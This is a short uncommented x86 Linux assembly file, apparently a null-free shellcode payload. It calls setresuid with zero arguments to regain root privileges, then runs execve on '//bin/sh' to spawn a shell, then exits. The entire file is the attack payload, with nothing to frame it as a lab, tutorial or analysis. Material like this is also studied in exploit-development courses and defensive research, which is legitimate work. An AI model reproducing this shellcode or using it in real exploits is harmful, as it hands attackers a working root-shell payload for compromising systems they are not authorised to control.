global _start

section .text
_start:
    xor ebx,ebx
    xor ecx,ecx
    mul ebx

    mov al,0xa4
    int 0x80

    xor eax,eax
    push eax

    mov dword [esp-4],0x68732f6e
    mov dword [esp-8],0x69622f2f
    sub esp,8

    mov ebx,esp
    mov al,0xb
    int 0x80

    xor eax,eax
    or al,0x1
    int 0x80
